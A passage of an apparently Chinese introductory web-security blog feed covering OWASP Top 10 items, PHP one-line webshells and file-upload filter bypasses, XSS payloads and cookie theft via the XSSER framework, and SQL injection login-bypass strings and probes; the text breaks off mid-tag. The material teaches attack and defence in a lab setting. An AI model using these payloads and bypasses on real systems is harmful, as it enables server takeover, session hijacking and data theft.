title="A6：安全配置错误"></a>A6：安全配置错误</h3><p>（1）安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成。</p><p>（2）防范方法：需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><h3 id="A7：跨站脚本（XSS）"><a href="#A7：跨站脚本（XSS）" class="headerlink" title="A7：跨站脚本（XSS）"></a>A7：跨站脚本（XSS）</h3><p>（1）当应用程序的新网页中包含不受信任的、未经恰当验证或转移的数据时，或者使用可以创建HTML或JavaScript的浏览器API更新现有的网页时，就会出现XSS缺陷。XSS让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p>（2）三种类型XSS：</p><ul><li>反射式XSS:应用程序或API包括未经验证转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。</li><li>存储式XSS：应用程序或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。该类型XSS一般被认为是高危或严重的风险。</li><li>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。</li></ul><h3 id="A8：2013-跨站请求伪造（CSRF）"><a href="#A8：2013-跨站请求伪造（CSRF）" class="headerlink" title="A8：2013 跨站请求伪造（CSRF）"></a>A8：2013 跨站请求伪造（CSRF）</h3><p>跨站请求伪造原理：一个跨站请求伪造攻击会迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的web应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。</p><h3 id="A9：不安全的反序列化"><a href="#A9：不安全的反序列化" class="headerlink" title="A9：不安全的反序列化"></a>A9：不安全的反序列化</h3><p>（1）序列化指将对象转换为字节序列的过程，就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。</p><p>（2）序列化的目的：为了解决在对对象流进行读写操作时所引发的问题。以某种存储形式使自定义对象持久化，将对象从一个地方传递到另一个地方；使程序更具维护性。</p><p>（3）反序列化原理：将二进制数据转换为原对象，即从一些列字节提取数据结构的反向操作。</p><p>（4）不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p><p>（5）对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。</p><p>（6）可能导致的两种主要类型的攻击：</p><ul><li>如果应用中存在可以在反序列过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。</li><li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</li></ul><h3 id="A10：使用含有已知漏洞的组件"><a href="#A10：使用含有已知漏洞的组件" class="headerlink" title="A10：使用含有已知漏洞的组件"></a>A10：使用含有已知漏洞的组件</h3><p>（1）组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><p>（2）经常爆出漏洞的组件：</p><ul><li>Weblogic</li><li>Strust-2</li></ul><p>（3）使用K8工具对Struts2进行利用</p><p><img src="https://i.loli.net/2021/02/01/SkxCHF5qPGWOIvl.png" alt="image-20210201113438259"></p><p><img src="https://i.loli.net/2021/02/01/fasUSd1K5Ao7jXh.png" alt="image-20210201113503859"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBshell与文件上传漏洞</title>
      <link href="2021/01/19/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEBshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/19/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEBshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><strong>Webshell：以网页形式存在的一种命令执行环境(是一种网页后门)</strong></p><h2 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h2><p>文件上传功能是大部分WEB应用的必备功能，网站允许用户自行上传头像、一些社交类网站允许用户上传照片、一些服务类网站需要用户上传证明材料的电子档、电商类网站允许用户上传图片展示商品情况等。然而，<strong>看似不起眼的文件上传功能如果没有做好安全防护措施，就存在巨大的安全风险。</strong> </p><h3 id="文件上传流程和上传攻击"><a href="#文件上传流程和上传攻击" class="headerlink" title="文件上传流程和上传攻击"></a>文件上传流程和上传攻击</h3><p>（1）如果WEB应用在<strong>文件上传过程</strong>中没有对文件的安全性进行有效的校验，攻击者可以通过<strong>上传WEBshell等恶意文件对服务器进行攻击</strong>，这种情况下认为系统存在文件上传漏洞。</p><p>（2）一个文件上传的一般流程：</p><p><img src="https://i.loli.net/2021/01/23/Ud94mZEj8iaf6vg.png" alt="image-20210123155132231"></p><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p><img src="https://i.loli.net/2021/01/23/bjMHPvfaRYDGpyE.png" alt="image-20210123163059178"></p><h3 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h3><p><img src="https://i.loli.net/2021/01/23/ZwovTqJ8hWBIfyH.png" alt="image-20210123163718803"></p><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="PHP执行命令函数"><a href="#PHP执行命令函数" class="headerlink" title="PHP执行命令函数"></a>PHP执行命令函数</h3><p>（1）**system()**：执行shell语句，输出并返回shell结果</p><pre><code class="php">&lt;?php    echo system(&#39;ipconfig&#39;);?&gt;</code></pre><p>（2）**passthru()**：调用命令，输出并返回执行结果</p><pre><code class="php">&lt;?php    echo passthru(&#39;whoami&#39;);?&gt;</code></pre><p>（3）**其他的命令执行函数：Exec()、Shell_exec()**：只执行命令(返回最后一行结果)</p><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p>（1）语法：<strong>eval(phpcode)</strong></p><p>（2）概念：把字符串按照PHP代码来计算</p><pre><code class="php">&lt;?php    $str=&quot;echo &#39;goktech&#39;;echo 333+333;&quot;;    echo $str;    echo &quot;&lt;br/&gt;&quot;;    eval(&quot;$str&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/01/23/yhIZj4lpfLukV3z.png" alt="image-20210123164741040"></p><p><strong>PS:该字符串必须是合法的PHP代码，且必须以分号结尾。</strong></p><h2 id="一句话木马原理及利用"><a href="#一句话木马原理及利用" class="headerlink" title="一句话木马原理及利用"></a>一句话木马原理及利用</h2><h3 id="WEBshell——网页木马文件"><a href="#WEBshell——网页木马文件" class="headerlink" title="WEBshell——网页木马文件"></a>WEBshell——网页木马文件</h3><p>最常见的利用文件上传漏洞的方法就是<strong>上传网站木马(webshell)文件</strong>。webshell根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。</p><table><thead><tr><th align="center"></th><th align="center">一句话木马(小马)</th><th align="center">大马</th></tr></thead><tbody><tr><td align="center">功能</td><td align="center">功能简单，需要配合客户端使用</td><td align="center">功能完善，直接使用浏览器即可利用</td></tr><tr><td align="center">大小</td><td align="center">代码量通常在一行左右，不超过10行</td><td align="center">代码量通常较大</td></tr><tr><td align="center">隐蔽性</td><td align="center">强，容易通过变形隐藏特征，绕过过滤</td><td align="center">相对较弱，代码量大，容易被检测出来，通常需要通过加密等方式来隐藏特征。</td></tr></tbody></table><h3 id="一句话木马介绍"><a href="#一句话木马介绍" class="headerlink" title="一句话木马介绍"></a>一句话木马介绍</h3><p>（1）eval()函数将传入的内容作为php脚本执行；</p><p>（2）$_POST[‘v’]传入想要执行的代码(v为参数名，可任意更改)；</p><p>（3）v为传递数据的参数，只有使用正确的参数名提交代码才能够被执行，因此v也称为一句话木马的<strong>密码</strong></p><p><img src="https://i.loli.net/2021/01/23/k6UP4gvN18MjwzF.png" alt="image-20210123170942615"></p><h3 id="一句话木马利用思路"><a href="#一句话木马利用思路" class="headerlink" title="一句话木马利用思路"></a>一句话木马利用思路</h3><p>（1）手动构造数据包利用的思路是<strong>提交命令行、文件处理等函数代码实现控制服务器；</strong></p><p>（2）自动化工具利用的思路是<strong>使用中国菜刀或Cknife等工具实现对服务器的控制；</strong></p><p>（3）中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理。利用上传到服务器的一句话脚本，再通过一些添加配置就可以工作了。</p><p>（4）Cknife的功能与中国菜刀类似，不同的是<strong>Cknife是一开源产品。</strong></p><p><img src="https://i.loli.net/2021/01/23/EzlmfTJqHe6bnax.png" alt="image-20210123171654387"></p><h3 id="一句话木马利用方式"><a href="#一句话木马利用方式" class="headerlink" title="一句话木马利用方式"></a>一句话木马利用方式</h3><h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>（1）上传木马文件test.php（@符号作用：不显示报错信息）</p><p><img src="https://i.loli.net/2021/01/23/lzqEdWa7Vp618Hu.png" alt="image-20210123172646352"></p><p>（2）浏览器连接，填写木马存放地址并访问：<a href="http://127.0.0.1/test.php">http://127.0.0.1/test.php</a></p><p>（3）利用hackbar工具手动构造命令并执行(注意：system()函数中命令包含多个单词，有空格则需要加双引号或单引号。)</p><p>如：<strong>v=system(ipconfig);</strong></p><p><strong>v=system(‘netstat -ano’);</strong></p><p><strong>v=system(‘ping <a href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>);</strong></p><p>（4）获取权限，命令执行结果可通过查看网页源代码更清晰直观显示。</p><p><img src="https://i.loli.net/2021/01/23/1pEeuUDczmYFvkj.png" alt="image-20210123173345789"></p><p><img src="https://i.loli.net/2021/01/23/m7g1hu5V6LGSkTz.png" alt="image-20210123173359330"></p><h4 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h4><p>（1）专用工具连接——Cknife</p><p><img src="https://i.loli.net/2021/01/23/kmF2NMnBcIorGWz.png" alt="image-20210123173602299"></p><p>（2）获取权限：右键URL可进行文件管理等操作，也可右键选择“模拟终端”，通过输入命令的方式控制服务器。</p><p><img src="https://i.loli.net/2021/01/23/7GwPkxsbnqVgZ6m.png" alt="image-20210123173824378"></p><p><img src="https://i.loli.net/2021/01/23/HRUzArytfD6WSXF.png" alt="image-20210123173853021"></p><h2 id="文件上传攻击"><a href="#文件上传攻击" class="headerlink" title="文件上传攻击"></a>文件上传攻击</h2><h3 id="文件上传漏洞测试思路"><a href="#文件上传漏洞测试思路" class="headerlink" title="文件上传漏洞测试思路"></a>文件上传漏洞测试思路</h3><p><img src="https://i.loli.net/2021/01/23/nNmCrzq1i9F5BKJ.png" alt="image-20210123182244608"></p><h3 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h3><p>（1）MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</p><p>（2）是设定某种扩展名的文件<strong>用一种应用程序来打开的方式类型</strong>,当该扩展名文件被访问时，浏览器会自动使用指定应用程序来打开。</p><p>（3）多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p>（4）标准的文件上传组件中会自动上传文件的MIME类型，但是由于MIME类型是从客户端传递的，修改也不影响文件正常运行，因此通过burp工具拦截和修改MIME类型可以轻易绕过此类检测。</p><table><thead><tr><th>常见的MIME类型</th></tr></thead><tbody><tr><td>xx.html超文本标记语言文本：text/html</td></tr><tr><td>xx.txt普通文本：text/plain</td></tr><tr><td>xx.pdf文档：application/pdf</td></tr><tr><td>xx.png图片：image/png</td></tr><tr><td>xx.jpg或xx.jpeg图片：image/jpeg</td></tr><tr><td>xx.gif图片：image/gif</td></tr><tr><td>xx.rtf文本：application/rtf</td></tr><tr><td>xx.asp：application/x-asap</td></tr></tbody></table><h3 id="文件上传漏洞利用"><a href="#文件上传漏洞利用" class="headerlink" title="文件上传漏洞利用"></a>文件上传漏洞利用</h3><h4 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h4><p>直接上传木马文件test.php，随后构造木马链接，访问木马并利用</p><p><img src="https://i.loli.net/2021/01/23/mGnxNlBq4pwo7aZ.png" alt="image-20210123183801625"></p><p><img src="https://i.loli.net/2021/01/23/ohA8xvTWGu9ecjV.png" alt="image-20210123183810063"></p><h4 id="JS校验-前端校验"><a href="#JS校验-前端校验" class="headerlink" title="JS校验(前端校验)"></a>JS校验(前端校验)</h4><p>（1）上传test1.php木马文件。无法成功上传，弹框要求以jpg、jpeg、JPG、JPEG这几种格式文件类型上传。</p><p><img src="https://i.loli.net/2021/01/23/xZFVUTIQf5ML91D.png" alt="image-20210123184202498"></p><p>（2）将木马文件test1.php后缀改为.jpg，再次上传文件，用burp抓包。在burp中修改文件后缀名为.php，点击Forward。</p><p><img src="https://i.loli.net/2021/01/23/7CABNjYmcWReHpa.png" alt="image-20210123184322559"></p><p>（3）上传成功后即可访问木马并利用</p><h4 id="MIME校验-后端校验"><a href="#MIME校验-后端校验" class="headerlink" title="MIME校验(后端校验)"></a>MIME校验(后端校验)</h4><p>（1）上传test2.php木马文件。无法成功上传，根据提示只能上传文件类型为JPEG或PNG的文件。</p><p><img src="https://i.loli.net/2021/01/23/gdKJ1EFzSulNMhy.png" alt="image-20210123184457521"></p><p>（2）将test2.php文件后缀名改为.jpeg,再次上传,用burp抓包。在burp中将木马文件的后缀名改为.php，点击Forward。或者不修改木马文件后缀名，而是将Content-Type的值改为image/jpeg也可成功上传木马文件。</p><p> <img src="https://i.loli.net/2021/01/23/LvBnV9khC5yuSX2.png" alt="image-20210123184614061"></p><p>（3）上传成功后即可访问木马并利用</p><h4 id="黑名单校验-后端校验"><a href="#黑名单校验-后端校验" class="headerlink" title="黑名单校验(后端校验)"></a>黑名单校验(后端校验)</h4><p>（1）上传test3.php木马文件。无法成功上传。</p><p><img src="https://i.loli.net/2021/01/23/7crZF8eUHpyOSxa.png" alt="image-20210123184828102"></p><p>（2）将test3.php后缀名大写PHP，再次上传。上传成功</p><p>（3）上传成功后即可访问木马并利用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS注入的原理与利用</title>
      <link href="2021/01/18/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/XSS%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2021/01/18/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/XSS%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="前端代码介绍"><a href="#前端代码介绍" class="headerlink" title="前端代码介绍"></a>前端代码介绍</h2><h3 id="前端开发三剑客-三种语言"><a href="#前端开发三剑客-三种语言" class="headerlink" title="前端开发三剑客(三种语言)"></a>前端开发三剑客(三种语言)</h3><p>（1）HTML：相当于一个文档，里面是要给用户的信息。使用他提供的一些标签，来把你想传递给用户的信息进行合理编排，使信息更好地传递给用户。(可以看成是一个人)</p><p>（2）CSS：相当于把这个文档进行修饰，美化实现更好的交互性，使用户接受信息更加舒服，自然。最好的修饰就是接近简洁，自然。(看成是一个人的外观)</p><p>（3）JavaScript：相当于更好地实现和用户的交互，使信息传递实现双向化。(看成是一个人的灵魂)</p><p><img src="https://i.loli.net/2021/01/18/Yv6WwENH8LikbGx.png" alt="image-20210118201537947"></p><h2 id="JavaScript详解"><a href="#JavaScript详解" class="headerlink" title="JavaScript详解"></a>JavaScript详解</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JavaScript是一种客户端脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML(标准通用标记语言下的一个应用)网页上使用，用来给HTML网页增加动态功能。</p><p>JavaScript基本特点：脚本编写语言，基于对象的语言，简单性，安全性，动态性，跨平台性</p><h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><p>JavaScript脚本都是写在script标签中。</p><pre><code class="javascript">&lt;script&gt;document.write(&quot;Hello World!&quot;)&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/z5SB7suPVNhQxUC.png" alt="image-20210118201339491"></p><h3 id="JavaScript常用脚本"><a href="#JavaScript常用脚本" class="headerlink" title="JavaScript常用脚本"></a>JavaScript常用脚本</h3><p>1.三种弹框函数</p><p>（1）alert()</p><pre><code class="javascript">&lt;script&gt;alert(666)&lt;/script&gt;</code></pre><p>（2）confirm()</p><p>（3）prompt()</p><p>2.跳转界面函数：window.location.href=</p><pre><code class="HTML">&lt;script&gt;window.location.href=&#39;https://www.baidu.com&#39;&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/YPbv6hNdnspqoI4.png" alt="image-20210118202224582"></p><p>3.读取cookie函数:document.cookie</p><pre><code class="javascript">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p><img src="https://i.loli.net/2021/01/18/2YQpLEbO8H63ITP.png" alt="image-20210118202759644"></p><p>4.引入js文件的属性。&lt;script&gt;可以通过”src”属性引入JavaScript文件</p><pre><code class="javascript">&lt;script src=&quot;1.js&quot;&gt;&lt;/script&gt;##1.js中：document.write(&quot;Hello World&quot;)</code></pre><h2 id="XSS注入漏洞的基本原理"><a href="#XSS注入漏洞的基本原理" class="headerlink" title="XSS注入漏洞的基本原理"></a>XSS注入漏洞的基本原理</h2><h3 id="XSS的简单介绍"><a href="#XSS的简单介绍" class="headerlink" title="XSS的简单介绍"></a>XSS的简单介绍</h3><p>（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆，故将<strong>跨站脚本攻击缩写为XSS</strong>。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p>（2）XSS的危害：</p><ul><li>流量劫持</li><li>获取用户cookie信息，盗取账号</li><li>篡改、删除页面信息(钓鱼)</li><li>配合CSRF攻击(跨站请求伪造)，实施进一步的攻击</li></ul><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p>通常将跨站脚本攻击分为三种类型：反射型XSS，存储型XSS，DOM型XSS</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>也被称为非持久型XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。例如网络钓鱼</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>也被称为持久型XSS，存储型XSS是<strong>最危险</strong>的一种跨站脚本漏洞，当攻击者提交一段XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。例如黑客的博客</p><p>例如：</p><p>（1）攻击者在留言板中提交一段XSS代码，服务端接收后并进行存储</p><p>（2）当管理员查看留言板时便触发了XSS代码，形成XSS跨站攻击</p><h2 id="XSS注入漏洞的利用"><a href="#XSS注入漏洞的利用" class="headerlink" title="XSS注入漏洞的利用"></a>XSS注入漏洞的利用</h2><h3 id="XSS注入思路"><a href="#XSS注入思路" class="headerlink" title="XSS注入思路"></a>XSS注入思路</h3><p><img src="https://i.loli.net/2021/01/18/zOeNdfRibYApMIn.png" alt="image-20210118211133079"></p><p>构造攻击代码的思路：</p><p>（1）判断位置</p><p>（2）闭合符号或标签</p><p>（3）放入基本的payload</p><h3 id="XSS注入位置"><a href="#XSS注入位置" class="headerlink" title="XSS注入位置"></a>XSS注入位置</h3><h4 id="script标签内"><a href="#script标签内" class="headerlink" title="script标签内"></a>script标签内</h4><p>无需闭合符号或标签直接插入JavaScript脚本</p><p><img src="https://i.loli.net/2021/01/18/7fntHMFEh3K25WP.png" alt="image-20210118212512886"></p><h4 id="标签内容位置"><a href="#标签内容位置" class="headerlink" title="标签内容位置"></a>标签内容位置</h4><p>需要闭合标签，构造新的script标签</p><p><img src="https://i.loli.net/2021/01/18/kh8rnDIFsiPCtZJ.png" alt="image-20210118212848130"></p><h4 id="标签的属性位置"><a href="#标签的属性位置" class="headerlink" title="标签的属性位置"></a>标签的属性位置</h4><p>闭合属性中的符号</p><p><img src="https://i.loli.net/2021/01/18/QFi4fley3wnhSap.png" alt="image-20210118212916577"></p><h3 id="基本的payload"><a href="#基本的payload" class="headerlink" title="基本的payload"></a>基本的payload</h3><ul><li>&lt;script&gt;alert(1)&lt;/script&gt;</li><li>&lt;body onload=alert(1)&gt;</li><li>&lt;input onclick=alert(1)&gt;</li><li>&lt;img src=1 onerror=alert(1)&gt;</li><li>&lt;a href=javascript:alert(1)&gt;</li></ul><h3 id="常见的攻击手段"><a href="#常见的攻击手段" class="headerlink" title="常见的攻击手段"></a>常见的攻击手段</h3><h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h4><p>攻击思路：首先针对目标用户访问的网站，寻找是否存在XSS漏洞；若存在，则构造攻击脚本发送给目标用户或者存放到主机；当用户再次访问该网站时就会触发攻击脚本，转而跳转到钓鱼网站，依此来获取目标用户的信息。</p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>攻击思路：攻击者在服务器端(例如留言板)提交一段XSS代码，当用户(特别是管理员)登录网站查看提交的数据时，就会触发这段XSS代码，并会给予用户一个cookie。这个cookie会被攻击者劫持，攻击者可以利用这个cookie，以目标用户的身份登录到该网站。</p><h2 id="XSSER的基本使用"><a href="#XSSER的基本使用" class="headerlink" title="XSSER的基本使用"></a>XSSER的基本使用</h2><p>XSSER是XSS漏洞利用的框架，通过使用XSSER的payload盗取用户的Cookie，并可以配置是否keepsession，保持会话，也可用来做认证钓鱼等XSS攻击，还可以自行创建XSS攻击模板，进行快速的利用。</p><p><strong>使用步骤</strong></p><p>（1）登录XSSER后台，创建一个项目，填写项目信息</p><p>（2）配置要使用的XSS漏洞利用模块，生成漏洞利用代码</p><p>（3）拷贝生成的代码，将代码植入到存在漏洞的站点上</p><p>（4）当受害者浏览漏洞页面时便触发了漏洞利用的代码，受害者的cookie被发送到XSSER框架的站点上</p><p>（5）攻击者浏览项目，便可获得受害者的会话信息</p><p>（最后可使用类似cookie manager的插件添加cookie信息登录到受害者的账号）</p><h2 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h2><p>（1）XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本攻击的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</p><p>（2）修复和防范方法：</p><ul><li>三种类型的XSS漏洞都可以通过<strong>过滤或编码</strong>进行修复。</li><li>反射型XSS和存储型XSS可以在服务端对用户输入输出的内容进行过滤和编码操作，将关键字进行过滤处理，关键符号进行编码处理，如将所有on事件，script等关键字进行过滤，将所有&lt;,&gt;,”,’,=等特殊符号进行实体化编码或百分号编码便可以修复。</li><li>DOM型XSS如有在服务端进行交互，也可参考上述的方法进行修复，如未和服务端进行交互，可在客户端使用JavaScript等客户端脚本语言进行编码和过滤处理。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的原理与利用</title>
      <link href="2020/12/27/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2020/12/27/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入漏洞的基本原理"><a href="#SQL注入漏洞的基本原理" class="headerlink" title="SQL注入漏洞的基本原理"></a>SQL注入漏洞的基本原理</h2><p>（1）sql注入：将用户的输入当作指令/代码在数据库中使用。</p><p>（2）sql注入产生的原因：开发者没有采用必要的措施，去避免用户的输入改变原有数据库的语义，没有过滤” ‘，<br>特殊字符and，or，=，#等等导致了sql注入漏洞(基于数据库的漏洞)的产生。</p><h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>（1）绕过登录验证：使用万能密码登录网站后台等</p><p>（2）获取敏感数据：获取网站管理员账号、密码等</p><p>（3）文件系统操作：列目录，读取、写入文件等</p><p>（4）注册表操作：读取、写入、删除注册表等</p><p>（5）执行系统的命令：远程执行命令</p><h3 id="万能密码攻击原理"><a href="#万能密码攻击原理" class="headerlink" title="万能密码攻击原理"></a>万能密码攻击原理</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>（1）登录账号是admin 密码是123456，万能密码用户名是admin 密码是1’ or ‘1’=’1。万能密码利用了数据库需要闭合的原理，并且利用优先级顺序。</p><pre><code class="sql">select * from user where username=&#39;admin&#39; and passowrd=&#39;123456&#39;;select * from user where username=&#39;admin&#39; and password=&#39;1&#39; or &#39;1&#39;=&#39;1&#39;;</code></pre><p>（2）优先级：=大于and大于or。=做完后，先进行and运算，再进行or运算，而’1’=’1’恒成立，所以只要数据库中有记录，返回的结果集一定不为空，则登录必成功。</p><p><img src="https://i.loli.net/2020/12/28/kBavR57mSynNdZE.png" alt="image-20201228165324137"></p><h4 id="三种经典的万能密码"><a href="#三种经典的万能密码" class="headerlink" title="三种经典的万能密码"></a>三种经典的万能密码</h4><table><thead><tr><th align="center"></th><th align="center">用户名已知</th><th align="center">可用注释符号</th><th align="center">用户名未知</th></tr></thead><tbody><tr><td align="center">用户名</td><td align="center">admin/admin’ or ‘1’=’1</td><td align="center">‘or 1=1#</td><td align="center">1’ or 1=1#;</td></tr><tr><td align="center">密码</td><td align="center">1’ or ‘1’=’1/ 随便输</td><td align="center">随便输</td><td align="center">随便输</td></tr></tbody></table><p>PS:#和–后面的内容表示注释，在浏览器中–要写为–+</p><p><img src="https://i.loli.net/2020/12/28/gSj9O7IMUWTX4dD.png" alt="image-20201228171242966"></p><p><img src="https://i.loli.net/2020/12/28/ZYKHCSpAL9e8OVf.png" alt="image-20201228171257768"></p><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table><thead><tr><th align="center">基于注入点位置分类</th><th align="center">基于变量数据类型分类</th><th align="center">基于获取数据的方法分类</th></tr></thead><tbody><tr><td align="center">GET注入、POST注入、Cookie注入</td><td align="center">字符型注入、数字型注入</td><td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td></tr></tbody></table><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>（1）判断注入漏洞的依据：根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p><p><img src="https://i.loli.net/2020/12/28/5CYkZlWUs4TPdpA.png" alt="image-20201228175211367"></p><p>（2）基本的获取数据payload</p><table><thead><tr><th align="center">查询数据库版本</th><th align="center">查询数据库名称</th><th align="center">查询当前数据库用户名</th></tr></thead><tbody><tr><td align="center">select version();</td><td align="center">select database();</td><td align="center">select user();</td></tr></tbody></table><p><img src="https://i.loli.net/2020/12/28/uhTsUySvpEXQNxA.png" alt="image-20201228175814830"></p><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>（1）参数后加单引号，报错。报错注入</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1&#39;select first_name,last_name from users where user_id=1&#39;;</code></pre><p>（2）参数后加and 1 =1,访问正常。布尔型盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and 1=1select first_name,last_name from users where user_id=1 and 1=1;</code></pre><p>（3）参数后加and 1=2，访问异常(如：无信息)。布尔型盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and 1=2select first_name,last_name from users where user_id=1 and 1=2;</code></pre><p>（4）sleep()函数。时间盲注</p><pre><code class="sql">http://127.0.0.1/2/sql1.php?id=1 and sleep(5)select first_name,last_name from users where user_id=1 and sleep(5);</code></pre><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>（1）参数后加单引号，报错。报错注入</p><pre><code 